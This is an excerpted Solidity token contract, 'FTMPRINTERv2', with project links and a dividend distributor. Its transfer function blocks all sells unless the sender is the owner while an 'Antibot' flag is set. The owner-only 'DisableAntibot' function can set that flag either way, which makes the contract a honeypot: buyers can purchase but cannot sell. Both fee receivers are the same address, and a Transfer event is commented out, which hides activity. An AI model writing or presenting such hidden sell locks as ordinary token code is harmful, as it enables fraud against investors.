...
https://t.me/ftmprinter
https://twitter.com/SpellPrint
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83);
...
contract FTMPRINTERv2 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FTMPRINTERv2";
    string constant _symbol = "FTMPv2";
    ...
    address public autoLiquidityReceiver=0x4dE646435536A9b336C277c1EB561d6c7beFE751; 
    address public marketingFeeReceiver=0x4dE646435536A9b336C277c1EB561d6c7beFE751; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Antibot || sender==owner), "Antibot disabled");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function DisableAntibot(bool value) external onlyOwner {
        Antibot = value;
    }
